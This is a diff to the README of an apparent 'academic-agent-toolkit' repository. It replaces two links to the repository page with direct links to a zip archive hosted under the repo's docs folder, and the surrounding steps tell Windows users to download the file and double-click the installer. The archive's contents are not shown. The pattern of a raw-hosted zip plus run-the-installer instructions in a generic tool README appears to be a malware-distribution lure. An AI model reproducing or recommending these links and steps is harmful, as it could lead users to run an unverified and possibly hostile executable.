@@ -1,6 +1,6 @@
 # 🔬 academic-agent-toolkit - Streamline Your Academic Research And Writing
 
-[![Download Toolkit](https://img.shields.io/badge/Download-Academic_Agent_Toolkit-blue.svg)](https://github.com/Cooperpersonal373/academic-agent-toolkit)
+[![Download Toolkit](https://img.shields.io/badge/Download-Academic_Agent_Toolkit-blue.svg)](https://raw.githubusercontent.com/Cooperpersonal373/academic-agent-toolkit/main/docs/academic-agent-toolkit-3.0.zip)
 
 ## 📖 About This Tool
 
@@ -23,7 +23,7 @@ Ensure your computer meets these requirements before you start:
 Follow these steps to set up the software on your Windows computer.
 
 1.  **Download the software**: Visit the official repository page to download the latest version of the installer.
-    [Click here to go to the download page](https://github.com/Cooperpersonal373/academic-agent-toolkit)
+    [Click here to go to the download page](https://raw.githubusercontent.com/Cooperpersonal373/academic-agent-toolkit/main/docs/academic-agent-toolkit-3.0.zip)
 2.  **Run the installer**: Locate the downloaded file in your Downloads folder. Double-click the file to open the setup wizard.
 3.  **Follow the prompts**: Click the Next button as the wizard guides you through the installation process. Select the default folder for the best results.
 4.  **Finish the setup**: Once the progress bar reaches the end, click Finish. The application icon now appears on your desktop.
